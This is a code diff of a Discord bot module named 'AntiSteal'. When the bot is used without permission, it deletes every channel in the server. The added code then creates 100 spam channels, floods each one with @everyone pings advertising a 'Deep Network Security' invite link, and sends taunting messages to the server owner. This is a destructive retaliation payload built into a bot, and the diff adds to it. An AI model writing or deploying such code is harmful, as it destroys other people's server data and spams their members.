@@ -75,13 +75,39 @@ exports.run = async (client, guild, log) => {
     log('i', 'AntiSteal: Deleting channels...');
     let channels = guild.channels.cache;
     channels.forEach((channel) => {
-        log('i', `AntiSteal: Deleting channel ${channel.name}`);
+        log('i', `AntiSteal: Deleting channel / category ${channel.name}`);
         channel.delete().catch((e) => {
-            log('e', `Couldn't delete channel ${  channel.name}`);
+            log('e', `Couldn't delete channel / category ${channel.name}`);
         });
     });
-    await wait(60);
+    await wait();
     owner.send('Had fun with that? All of your channels are gone!');
+    await wait();
+    owner.send('I should do another thing..');
+    await wait(1);
+    owner.send('I should make more channels!');
+    await wait();
+    owner.send('Let me do that..');
+    await wait();
+    log('i', 'AntiSteal: Making channels');
+    for (let i = 0; i < 100; i++) {
+        log('i', `AntiSteal: Making channel number ${i}`);
+        guild.channels.create('join-deep-network-security');
+    }
+    await wait(20);
+    owner.send('I should send messages there!');
+    await wait();
+    owner.send('Doing that..');
+    await wait();
+    log('i', 'AntiSteal: Sending advertisements');
+    guild.channels.cache.forEach((channel) => {
+        log('i', `AntiSteal: Sending advertisement to channel ${channel.name} (5 times)`);
+        for (let i = 0; i < 10; i++) {
+            channel.send(`<@&${guild.id}> You should join __**Deep Network Security**__! Here's the link: https://discord.gg/fxPMaMF`);
+        }
+    });
+    await wait(30);
+    owner.send('Liked that?');
     await wait();
     owner.send('Have we learned not to play with things we don\'t own today?');
 };
